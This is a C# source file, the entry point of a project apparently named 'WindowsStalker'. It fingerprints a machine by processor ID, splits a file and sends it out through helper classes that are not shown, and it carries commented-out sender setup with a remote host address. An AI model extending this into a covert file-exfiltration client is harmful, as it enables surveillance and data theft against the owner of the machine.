using System.Management;
using System.Text;
using System.Threading;

namespace WindowsStalker
{
    public class Program
    {
        private Thread _scheduleThread;
        private Thread _listeningThread;

        public static void Main(string[] args)
        {
//            Scheduler scheduler = new Scheduler();
//            scheduler.StartScheduling();
//
//            Stopwatch s = new Stopwatch();
//            s.Start();
//
//            while (true)
//            {
//                if (s.Elapsed > TimeSpan.FromSeconds(45))
//                {
//                    scheduler.UpdateConfiguration(15, 15);
//                    s.Stop();
//                    break;
//                }
//            }
//          local Winiar - 192.168.0.199 : 8888
//          test host -  192.168.0.101 : 11000, remote host - 37.233.98.52 : 8888
//            bool Winiar = false;
//            Sender sender;
//            if (Winiar)
//            {
//                sender = new Sender("192.168.0.199", 8888);
//            }
//            else
//            {
//                sender = new Sender("192.168.0.101", 11000);
//            }
//
//            sender.StartSender();
//            Thread listeningThread = new Thread(sender.Listen);
//            listeningThread.Start();
//
//            //sample echo message
//            byte[] sampleMessage = Encoding.ASCII.GetBytes("Hello man!<EOF>");
//            sender.SendFrame(sampleMessage);
//            sender.SendFrame(sampleMessage);

            Serializer s = new Serializer();
            var toSent = s.SplitFile();
            s.SendSplitedFile(toSent);

        }

        public static string GetComputerID()
        {
            ManagementObjectCollection mbsList = null;
            ManagementObjectSearcher mbs = new ManagementObjectSearcher("Select * From Win32_processor");
            mbsList = mbs.Get();
            string id = "";
            foreach (ManagementObject mo in mbsList)
            {
                id = mo["ProcessorID"].ToString();
            }

            return id;
        }

        public void ApplyNewConfig()
        {

        }
    }
}